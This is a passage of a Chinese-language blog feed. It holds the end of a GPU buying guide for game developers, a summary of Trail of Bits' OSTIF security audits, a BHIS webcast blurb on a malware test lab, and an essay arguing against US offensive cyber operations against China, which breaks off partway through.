&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;专业级选择&lt;/strong&gt;：&lt;br&gt;
ASUS ROG Strix RTX 4090 OC是目前最强显卡，拥有卓越的处理速度、24GB显存和光线追踪能力，但价格高昂，适合职业开发者。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.asus.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;查看ASUS显卡价格&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;中端选择&lt;/strong&gt;：&lt;br&gt;
MSI Geforce RTX 4070 Ti 12GB虽然显存和带宽只有RTX 4090的一半，但时钟频率优异，能满足大多数游戏开发需求。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.msi.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;查看MSI显卡价格&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;预算选择&lt;/strong&gt;：&lt;br&gt;
Gigabyte Geforce RTX 3060 OC 12GB是性价比之选，支持光线追踪和DLSS 2.0技术，价格仅为RTX 4090的五分之一。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.gigabyte.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;查看Gigabyte显卡价格&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;三大游戏开发gpu深度评测&#34;&gt;三大游戏开发GPU深度评测
&lt;/h2&gt;&lt;h3 id=&#34;旗舰之选---asus-rog-strix-geforce-rtx-4090-oc&#34;&gt;旗舰之选 - ASUS ROG Strix GeForce RTX® 4090 OC
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;出厂超频至2640MHz（可超至3GHz+）&lt;/li&gt;
&lt;li&gt;行业领先的高带宽24GB显存&lt;/li&gt;
&lt;li&gt;顶级光线追踪性能&lt;/li&gt;
&lt;li&gt;搭载DLSS 3.0技术&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;劣势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;高昂售价&lt;/li&gt;
&lt;li&gt;需配备1000W以上电源&lt;/li&gt;
&lt;li&gt;需要大机箱和强力散热&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;结论&lt;/strong&gt;：当前市场最强显卡，能最大限度提升开发效率。&lt;/p&gt;
&lt;h3 id=&#34;中端优选---msi-gaming-geforce-rtx-4070-ti&#34;&gt;中端优选 - MSI Gaming GeForce RTX 4070 Ti
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GDDR6x高速显存&lt;/li&gt;
&lt;li&gt;优秀的光追和DLSS性能&lt;/li&gt;
&lt;li&gt;比RTX 4090节能40%&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;劣势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;12GB显存（RTX 4090为24GB）&lt;/li&gt;
&lt;li&gt;CUDA核心数量减半&lt;/li&gt;
&lt;li&gt;内存带宽500GB/s（RTX 4090为1000GB/s）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;结论&lt;/strong&gt;：除非开发3A级复杂场景，否则完全够用。&lt;/p&gt;
&lt;h3 id=&#34;入门首选---gigabyte-geforce-rtx-3060-oc&#34;&gt;入门首选 - Gigabyte Geforce RTX 3060 OC
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新手友好价格&lt;/li&gt;
&lt;li&gt;12GB显存&lt;/li&gt;
&lt;li&gt;仅需200W功耗&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;劣势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基础频率1800MHz&lt;/li&gt;
&lt;li&gt;3584个CUDA核心&lt;/li&gt;
&lt;li&gt;GDDR6显存（非GDDR6x）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;结论&lt;/strong&gt;：预算有限时的性能与价格平衡之选。&lt;/p&gt;
&lt;h2 id=&#34;游戏开发显卡选购要点&#34;&gt;游戏开发显卡选购要点
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;大显存&lt;/strong&gt;：复杂3D场景建议至少12GB VRAM&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高带宽&lt;/strong&gt;：256-384bit位宽配合高内存时钟&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多处理器&lt;/strong&gt;：CUDA核心数量决定并行处理能力&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高主频&lt;/strong&gt;：GPU核心时钟速度影响运算效率&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;光追支持&lt;/strong&gt;：新一代显卡配备专用光追核心&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;三步选购法&#34;&gt;三步选购法
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;设定预算&lt;/strong&gt;：根据职业需求确定投入规模&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;明确需求&lt;/strong&gt;：区分核心功能与附加特性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;精准匹配&lt;/strong&gt;：结合预算和需求选择最佳型号&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>通过OSTIF强化开源基础设施安全 - Trail of Bits技术实践</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87ostif%E5%BC%BA%E5%8C%96%E5%BC%80%E6%BA%90%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-trail-of-bits%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Mon, 04 Aug 2025 09:37:51 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87ostif%E5%BC%BA%E5%8C%96%E5%BC%80%E6%BA%90%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%AE%89%E5%85%A8-trail-of-bits%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h3 id=&#34;开源基础设施的安全挑战&#34;&gt;开源基础设施的安全挑战
&lt;/h3&gt;&lt;p&gt;开源技术改进基金（OSTIF）正致力于解决开源生态中一个常被忽视的问题：支撑当今互联网基础设施的关键软件项目，其开发、测试和维护仅依赖&amp;quot;数量惊人的少数贡献者&amp;quot;。正如OSTIF所指出的，&amp;ldquo;由于缺乏利润驱动，核心开源项目资金严重不足，导致关键互联网基础设施暴露在漏洞、文档缺失、性能低下甚至间谍活动的风险中&amp;rdquo;。&lt;/p&gt;
&lt;h3 id=&#34;我们的安全评估方法论&#34;&gt;我们的安全评估方法论
&lt;/h3&gt;&lt;p&gt;在Trail of Bits，我们提供多种安全服务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;定制化代码审计&lt;/strong&gt;：结合模糊测试工具链开发、静态分析规则集和定向人工审查&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;威胁建模&lt;/strong&gt;：涵盖架构审查、系统思维和威胁场景构建&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CI/CD管道强化&lt;/strong&gt;：以及修复方案验证
我们通常会组建跨领域专家团队，例如先进行威胁建模再开展代码审计，使模糊测试能快速锁定代码库中最脆弱的环节。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;重点项目安全评估案例&#34;&gt;重点项目安全评估案例
&lt;/h3&gt;&lt;h4 id=&#34;linux内核发布签名机制2021年3-4月&#34;&gt;Linux内核发布签名机制（2021年3-4月）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;审计重点：签名密钥管理、开发者工作流、加密算法实现&lt;/li&gt;
&lt;li&gt;关键建议：
&lt;ul&gt;
&lt;li&gt;强制使用智能卡存储私钥&lt;/li&gt;
&lt;li&gt;用ECDSA/Ed25519替代RSA/DSA算法&lt;/li&gt;
&lt;li&gt;建立密钥管理策略文档&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;curllibcurl审查2022年9-10月&#34;&gt;curl/libcurl审查（2022年9-10月）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;通过威胁建模发现14个问题，包括：
&lt;ul&gt;
&lt;li&gt;2个高危内存损坏漏洞（通过并行模糊测试发现）&lt;/li&gt;
&lt;li&gt;改进后的模糊测试系统后续发现CVE-2022-42915等漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;kubernetes事件驱动扩缩容keda2022年12月&#34;&gt;Kubernetes事件驱动扩缩容（KEDA，2022年12月）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;发现Redis通信未启用TLS的中间人攻击风险&lt;/li&gt;
&lt;li&gt;开发定制Semgrep规则检测编码模式问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;eclipse-mosquitto2023年3月&#34;&gt;Eclipse Mosquitto（2023年3月）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;威胁模型暴露架构缺陷：
&lt;ul&gt;
&lt;li&gt;缺乏全局速率限制配置&lt;/li&gt;
&lt;li&gt;无法防御消息循环拒绝服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;代码审计发现：
&lt;ul&gt;
&lt;li&gt;可远程触发的堆内存转储漏洞&lt;/li&gt;
&lt;li&gt;HTTP头解析绕过审计控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术演进与未来计划&#34;&gt;技术演进与未来计划
&lt;/h3&gt;&lt;p&gt;我们将持续改进评估方法，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发布curl模糊测试基础设施的深度技术解析&lt;/li&gt;
&lt;li&gt;公开OpenSSL和Mosquitto评估中发现的有趣漏洞技术细节&lt;/li&gt;
&lt;li&gt;对已完成项目进行修复验证&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>构建与维护恶意软件动物园：C2/植入测试平台实战解析</title>
        <link>http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E4%B8%8E%E7%BB%B4%E6%8A%A4%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8A%A8%E7%89%A9%E5%9B%ADc2/%E6%A4%8D%E5%85%A5%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0%E5%AE%9E%E6%88%98%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 09:21:28 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E4%B8%8E%E7%BB%B4%E6%8A%A4%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8A%A8%E7%89%A9%E5%9B%ADc2/%E6%A4%8D%E5%85%A5%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0%E5%AE%9E%E6%88%98%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;webcast-构建与维护恶意软件动物园&#34;&gt;WEBCAST: 构建与维护恶意软件动物园
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;John Strand&lt;/strong&gt;//&lt;/p&gt;
&lt;p&gt;跟随John了解BHIS系统团队的最新工作成果——构建C2/植入/恶意软件测试平台。测试各类C2/恶意软件解决方案至关重要，因为厂商往往会夸大其产品能力。他将通过MITRE ATT&amp;amp;CK框架交叉分析不同恶意软件样本，并讲解如何运用这些技术来测试终端和网络层面的防御方案。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blackhillsinformationsecurity.shootproof.com/gallery/7613320/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;幻灯片下载&lt;/a&gt;&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://blackhillsinfosec.us15.list-manage.com/subscribe?u=e12efe2af6573cc76c90fc019&amp;amp;id=b7b017ed3a&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;订阅邮件通知获取最新直播信息&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;进阶学习推荐&lt;/strong&gt;&lt;br&gt;
想向John直接学习更多实战技能？可参加以下课程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SOC核心技能&lt;/li&gt;
&lt;li&gt;主动防御与网络欺骗&lt;/li&gt;
&lt;li&gt;BHIS与MITRE ATT&amp;amp;CK安全入门&lt;/li&gt;
&lt;li&gt;渗透测试基础&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（支持实时/虚拟及点播形式）&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;延伸资源&lt;/em&gt;&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/podcast-malware-zoo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;《我是如何破解128位密码的》播客&lt;/a&gt;&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/podcast-malware-zoo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;《构建恶意软件动物园》播客&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>美国需要新的网络安全战略：进攻性网络行动并非答案</title>
        <link>http://localhost:1313/p/%E7%BE%8E%E5%9B%BD%E9%9C%80%E8%A6%81%E6%96%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%88%98%E7%95%A5%E8%BF%9B%E6%94%BB%E6%80%A7%E7%BD%91%E7%BB%9C%E8%A1%8C%E5%8A%A8%E5%B9%B6%E9%9D%9E%E7%AD%94%E6%A1%88/</link>
        <pubDate>Mon, 04 Aug 2025 09:05:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BE%8E%E5%9B%BD%E9%9C%80%E8%A6%81%E6%96%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%88%98%E7%95%A5%E8%BF%9B%E6%94%BB%E6%80%A7%E7%BD%91%E7%BB%9C%E8%A1%8C%E5%8A%A8%E5%B9%B6%E9%9D%9E%E7%AD%94%E6%A1%88/</guid>
        <description>&lt;h1 id=&#34;美国需要新的网络安全战略进攻性网络行动并非答案&#34;&gt;美国需要新的网络安全战略：进攻性网络行动并非答案
&lt;/h1&gt;&lt;p&gt;自从中国&amp;quot;盐台风&amp;quot;黑客行动针对美国电信网络的攻击被曝光后，关于&amp;quot;黑客反击&amp;quot;的讨论就层出不穷。但究竟什么构成黑客反击仍是个谜。有人认为美国应该对中国采取对等措施，而另一些人则认为应该更进一步，对中国基础设施发动进攻性网络行动作为威慑。&lt;/p&gt;
&lt;h2 id=&#34;了解台风行动&#34;&gt;了解&amp;quot;台风&amp;quot;行动
&lt;/h2&gt;&lt;p&gt;&amp;ldquo;台风&amp;quot;是微软命名体系的一部分，用于指代中国国家支持的黑客组织。前缀则是用来区分不同中国支持的行动的随机词汇。每个安全厂商都有自己的命名体系来分类和区分恶意行为者或活动。&lt;/p&gt;
&lt;h3 id=&#34;盐台风行动&#34;&gt;盐台风行动
&lt;/h3&gt;&lt;p&gt;盐台风是最高调的&amp;quot;台风&amp;quot;行动之一，导致了2024年8月披露的重大美国电信网络入侵。攻击者通过利用路由器和交换机等网络硬件中的漏洞，几乎入侵了所有美国主要电信公司。调查仍在进行中，但攻击似乎针对的是与《1994年通信协助执法法案》(CALEA)相关的系统。&lt;/p&gt;
&lt;p&gt;CALEA系统提供两种监听能力：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;记录通话和短信元数据&lt;/li&gt;
&lt;li&gt;实时监控电话和短信&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;盐台风成功入侵了几家主要电信公司的CALEA系统，使他们能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查看当前被监控的电话号码&lt;/li&gt;
&lt;li&gt;拦截他们选择的目标的电话和短信&lt;/li&gt;
&lt;li&gt;访问记录通话或短信时间的元数据&lt;/li&gt;
&lt;li&gt;查看通信来源的基站，揭示目标的大致位置&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;伏特台风行动&#34;&gt;伏特台风行动
&lt;/h3&gt;&lt;p&gt;伏特台风主要针对美国及其领土内的关键基础设施组织和主要行业。与盐台风完全专注于间谍活动不同，伏特台风的某些活动暗示了更具军事目的的目标。在许多报告的入侵中，该组织被发现对运营技术(OT)网络进行侦察，并搜索有关灾难恢复计划的信息。&lt;/p&gt;
&lt;p&gt;伏特台风的活动让人想起俄罗斯早期对乌克兰电力基础设施的入侵。黑客花费数年时间侵入这些网络，绘制连接系统图，了解其操作程序、安全措施和恢复计划。获取的情报和访问权限使他们能够构建BlackEnergy3和Industroyer两种恶意软件，用于在乌克兰造成大规模停电。&lt;/p&gt;
&lt;h2 id=&#34;隐蔽代理网络&#34;&gt;隐蔽代理网络
&lt;/h2&gt;&lt;p&gt;中国黑客面临的一个问题是，许多安全的美国网络都在密切监控(甚至完全阻止)来自中国的网络流量。历史上，中国黑客通过从美国云提供商处购买服务器来解决这个问题。最近，包括中国在内的几个国家通过构建被入侵设备网络(通常称为僵尸网络)来解决这个问题。&lt;/p&gt;
&lt;p&gt;这些隐蔽代理网络的一个巨大优势是有源源不断的不安全设备可供入侵。大公司、云提供商和政府机构通常有大量安全监控预算，但消费者和小型企业则没有。因此，威胁行为者可以简单地入侵安全性差的美国系统，然后利用这些系统入侵更安全的网络。&lt;/p&gt;
&lt;h2 id=&#34;为什么我对以牙还牙的黑客威慑持怀疑态度&#34;&gt;为什么我对&amp;quot;以牙还牙&amp;quot;的黑客威慑持怀疑态度
&lt;/h2&gt;&lt;p&gt;我见过的一个常见说法是，美国可以通过对等回应来威慑中国黑客。这是我最怀疑的断言。虽然我不了解任何美国情报行动，因此无法确认他们在做什么或没做什么，但我们可以参考2014年的斯诺登泄密事件来获得一些见解。&lt;/p&gt;
&lt;p&gt;根据公开已知的黑客行动背景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;社会主义行动&lt;/strong&gt;：这是GCHQ主导的一项行动，入侵了比利时最大的电信公司Belgacom。泄露的细节与盐台风入侵美国电信公司惊人地相似。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;巨人射击行动&lt;/strong&gt;：纽约时报报道的这项行动详细描述了NSA针对中国科技巨头华为的行动。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NSA的拦截计划&lt;/strong&gt;：拦截计划是NSA一系列专注于供应链入侵的行动集合。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因此，如果美国情报合作伙伴在2010年就对盟友进行类似盐台风的攻击，NSA几十年来一直在路由器中植入后门，并且有公开已知的NSA入侵中国网络和中国公司的案例，我猜测如果NSA没有对中国进行类似盐台风的入侵，那是因为他们根本不需要或不想这样做。&lt;/p&gt;
&lt;h2 id=&#34;进攻性网络行动与威慑&#34;&gt;进攻性网络行动与威慑
&lt;/h2&gt;&lt;h3 id=&#34;什么是进攻性网络行动&#34;&gt;什么是进攻性网络行动？
&lt;/h3&gt;&lt;p&gt;进攻性网络行动(OCO)是一个经常被军事和情报领域之外的人混淆的术语。黑客行为本身是进攻性的，而不是防御性的，因此许多人错误地将OCO与一般的黑客行为混为一谈。然而，在军事术语中，黑客行为，或更具体地说计算机网络利用(CNE)，本身并不被视为OCO。&lt;/p&gt;
&lt;p&gt;在黑客行为的背景下，进攻性网络行动是指使用CNE来拒绝、降低、破坏或摧毁对手的计算机系统或行动。它需要有造成破坏的意图，而不仅仅是破坏作为二阶效应。&lt;/p&gt;
&lt;h3 id=&#34;为什么进攻性网络行动如此令人困惑&#34;&gt;为什么进攻性网络行动如此令人困惑？
&lt;/h3&gt;&lt;p&gt;我在最近的演讲《网络攻击的未来》中讨论过，公众普遍认为针对美国的国家支持的进攻性网络行动已经很常见。普通美国人并不将这些入侵视为各国相互进行网络间谍活动的情况，而是视为对美国的无端攻击。&lt;/p&gt;
&lt;p&gt;我认为公众对OCO的普遍困惑源于两个不同因素的结合：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&amp;ldquo;网络攻击&amp;quot;一词被通俗地用作任何形式的网络入侵的统称。&lt;/li&gt;
&lt;li&gt;在网络入侵方面存在隐性和显性的信息不对称。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;进攻性网络行动能威慑中国吗&#34;&gt;进攻性网络行动能威慑中国吗？
&lt;/h3&gt;&lt;h4 id=&#34;施加成本&#34;&gt;施加成本
&lt;/h4&gt;&lt;p&gt;在网络安全中你经常听到的一个流行词是&amp;quot;施加成本&amp;rdquo;，这只是&amp;quot;使对手的行动更加昂贵&amp;quot;的一种说法，理想情况下希望完全阻止他们，或者至少减少其影响和频率。有两种主要方法来对对手施加成本：防御性和进攻性。&lt;/p&gt;
&lt;p&gt;当涉及到针对网络犯罪行为的进攻性网络行动时，这是一个简单得多的等式。毕竟，网络犯罪是一种业务，经济动机的威胁行为者只关心利润。然而，对国家行为者施加成本则完全是另一回事。&lt;/p&gt;
&lt;h4 id=&#34;国家行为的成本效益分析&#34;&gt;国家行为的成本效益分析
&lt;/h4&gt;&lt;p&gt;国家行为的计算可能非常复杂，并且经常被误解。一个最近的例子是俄罗斯入侵乌克兰。在入侵前夕，许多知名智库甚至外国政府都在反驳美国政府关于入侵迫在眉睫的评估。他们论点的核心是，俄罗斯因国际制裁而可能失去的比入侵成功可能获得的要多得多。但令许多人惊讶的是，他们还是这样做了。&lt;/p&gt;
&lt;p&gt;同样，朝鲜和伊朗尽管受到严厉的国际制裁，仍继续发展核武器。美国和其盟友不断对伊朗的核计划进行进攻性网络行动和常规军事行动，但他们仍未被阻止。就朝鲜而言，制裁已经削弱了他们的经济，以至于他们开始从事国家支持的网络犯罪，但仍继续追求其核野心。&lt;/p&gt;
&lt;p&gt;对中国来说，可能没有太大的成本。正如我前面提到的，伏特台风的目标很可能是帮助中国建立破坏美国关键基础设施的能力。鉴于拜登总统曾表示，如果中国入侵台湾，美军将保卫台湾，因此中国的能力很可能是为了威慑美国。&lt;/p&gt;
&lt;h4 id=&#34;如果有成本我们能负担得起吗&#34;&gt;如果有成本，我们能负担得起吗？
&lt;/h4&gt;&lt;p&gt;假设确实存在某种程度的进攻性网络行动会导致中国停止或减少其对美国的网络行动。那么问题就变成了，美国能负担得起这个成本吗？正如参议员沃纳所说，更换老化和脆弱的网络设备可能会让电信公司花费数百亿美元，而将中国人从美国庞大的电话系统的每个角落驱逐出去可能需要5万人和完全关闭网络12小时。&lt;/p&gt;
&lt;p&gt;虽然我找不到采访的完整记录，也不清楚沃纳参议员是否打算用这一点作为美国需要对中国更强硬的论据，但Lawfare博客文章是这样表述的。我个人则完全持相反观点，认为这是不要冒险与中国升级的好理由，至少现在不要。&lt;/p&gt;
&lt;h2 id=&#34;从防御者的角度看&#34;&gt;从防御者的角度看
&lt;/h2&gt;&lt;p&gt;虽然我不声称自己对美国的进攻能力了解多少，但我对网络防御非常熟悉，因为这一直是我的主要关注领域。为了提供对美国网络防御不足的一些见解，我将借鉴我处理过的几起重大网络事件。&lt;/p&gt;
&lt;h3 id=&#34;mirai&#34;&gt;Mirai
&lt;/h3&gt;&lt;p&gt;我的网络安全职业生涯始于Mirai时代。Mirai恶意软件带来了一个全新的网络安全时代。在此之前，犯罪黑客主要专注于攻击桌面和服务器系统，但Mirai针对的是物联网设备。&lt;/p&gt;
&lt;p&gt;Mirai表面上非常简单。开发者发现许多物联网设备暴露了供管理员远程控制它们的协议；通常是SSH或telnet。大多数设备所有者甚至不知道这些协议的存在，更不用说设备默认自动将它们暴露在互联网上。&lt;/p&gt;
&lt;p&gt;许多此类设备都带有默认的管理员登录信息，如用户名：&amp;ldquo;admin&amp;rdquo;，密码：&amp;ldquo;admin&amp;rdquo;，这些信息设计为由所有者在设置设备时更改。当然，对于一个你甚至不知道存在的账户，很难更改密码。&lt;/p&gt;
&lt;p&gt;结果是有史以来最大、最强大的DDoS僵尸网络。这个僵尸网络如此强大，在一次试图使Minecraft服务器离线的尝试中，操作者使互联网最大的DNS提供商之一的系统过载，导致全球互联网中断。&lt;/p&gt;
&lt;p&gt;尽管这发生在近十年前，但问题仍然存在。英国通过了一项法律，要求物联网设备如果有默认密码，则必须对每个设备都是唯一的。而美国则没有通过任何有意义的法规作为回应。&lt;/p&gt;
&lt;h3 id=&#34;wannacry&#34;&gt;WannaCry
&lt;/h3&gt;&lt;p&gt;可能是我最不喜欢和最常被讲述的故事，但即使到今天，WannaCry仍然是有史以来最具破坏性的网络攻击，它带来了一些重要的教训。&lt;/p&gt;
&lt;p&gt;WannaCry是由朝鲜国家支持的黑客创建的勒索软件。它的独特之处在于它使用了一个极其强大的Windows漏洞来自动从一台计算机传播到另一台计算机，完全无需人工干预。&lt;/p&gt;
&lt;p&gt;正如你们许多人知道的，我是通过激活其杀死开关来阻止WannaCry网络攻击的人。随着时间的推移，我还可以跟踪有多少网络仍然没有安装漏洞修复程序，尽管WannaCry的严重性和全球媒体关注。&lt;/p&gt;
&lt;p&gt;即使是现在，近8年过去了，仍有数千个网络没有安装安全补丁。讽刺的是，由于我自己跟踪的限制，我可能永远不知道WannaCry的真正规模。&lt;/p&gt;
&lt;h3 id=&#34;log4j&#34;&gt;Log4j
&lt;/h3&gt;&lt;p&gt;可能是我处理过的最混乱的事件之一是Log4j。它既不是最大的，也不是最严重的，但由于Log4j漏洞不在单个软件中，而是在一个软件库中，因此它特别复杂。&lt;/p&gt;
&lt;p&gt;软件库有点像食谱中的成分。一批坏面粉可能使从蛋糕到饼干的许多不同产品变得不安全，而软件库漏洞对软件也是如此。由于Log4j被数百万应用程序使用，这是一个巨大的问题。&lt;/p&gt;
&lt;h2 id=&#34;网络安全要点&#34;&gt;网络安全要点
&lt;/h2&gt;&lt;p&gt;虽然我不能讨论我职业生涯中处理过的许多其他事件，但它们都让我回到了几个核心问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;组织由于成本原因不愿更新过时的硬件和软件。&lt;/li&gt;
&lt;li&gt;组织安装安全修复程序的速度很慢，并且经常禁用自动安装安全修复程序的内置功能，因为有时会导致系统不稳定。&lt;/li&gt;
&lt;li&gt;联邦政府没有制定任何广泛适用的有意义的网络安全或数据隐私立法，只有针对特定部门高度特定问题的法律。&lt;/li&gt;
&lt;li&gt;许多用户甚至不知道他们拥有或控制的系统中的安全漏洞，而且不存在可靠的框架来通知他们或为他们解决问题。&lt;/li&gt;
&lt;li&gt;随着软件供应链变得越来越复杂，修复其中的漏洞也变得复杂，但我们的修复策略没有跟上发展。&lt;/li&gt;
&lt;li&gt;安全软件、设备和员工都很昂贵，即使是最基本的网络安全卫生也设置了很高的门槛。&lt;/li&gt;
&lt;li&gt;许多技术部门采用&amp;quot;快速行动，打破常规&amp;quot;的心态，旨在尽快将产品推向市场，通常没有建立长期的弹性。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;为什么最好的防御不是好的进攻&#34;&gt;为什么最好的防御不是好的进攻
&lt;/h2&gt;&lt;p&gt;在足球中，你也许可以用好的进攻来替代差的防守，因为只有一个球。即使在常规战争中，也可以说这种说法有一定道理。军事资产是有形的物品，可以预先摧毁以限制对手的响应能力。&lt;/p&gt;
&lt;p&gt;网络安全则非常不同。一旦网络能力被开发出来，它们可以随时从任何地方部署。发动WannaCry或Mirai不需要机场或坦克工厂，只需要世界上任何地方的一个人和一台计算机。&lt;/p&gt;
&lt;p&gt;现在，我们可能可以假设美国的进攻性网络能力超过中国，因为美国有巨大的先发优势。然而，看到中国技术在各个领域的快速进步，我对此越来越不确定。无论如何，我认为这实际上并不重要。没有任何数量的进攻性网络行动能物理上阻止中国入侵或破坏美国网络。&lt;/p&gt;
&lt;p&gt;最理想的情况是美国的进攻性网络行动或其威胁简单地吓阻中国停止。鉴于中国很可能将其网络能力视为在与美国发生军事对抗时获胜的关键，我认为这极不可能。更现实的结果是美国创造了一个新规范，即超越间谍活动的网络行动现在在和平时期是被允许的，而中国也会相应回应。这也可能导致其他美国对手的升级。&lt;/p&gt;
&lt;h2 id=&#34;经济政治与网络安全之间的斗争&#34;&gt;经济、政治与网络安全之间的斗争
&lt;/h2&gt;&lt;h3 id=&#34;中国政府的简要介绍&#34;&gt;中国政府的简要介绍
&lt;/h3&gt;&lt;p&gt;在不深入探讨中国制度的历史和细节的情况下，可以将其视为一个单一政党的单一制国家。西方民主国家倾向于选择某种权力分立(通常在司法和立法/行政部门之间，或者在美国的情况下，所有三个部门之间)，而中国则选择了一个更加集中和统一的政府。&lt;/p&gt;
&lt;p&gt;尽管中国允许其人民参与资本主义，但政府非常小心，避免私营企业或个人积累足够的权力来威胁其权威。因此，中共在通过甚至非常广泛的立法时遇到的阻力要小得多，他们利用这一点通过了几项全面的法律来管理网络安全、数据隐私和国家安全。&lt;/p&gt;
&lt;h3 id=&#34;美国&#34;&gt;美国
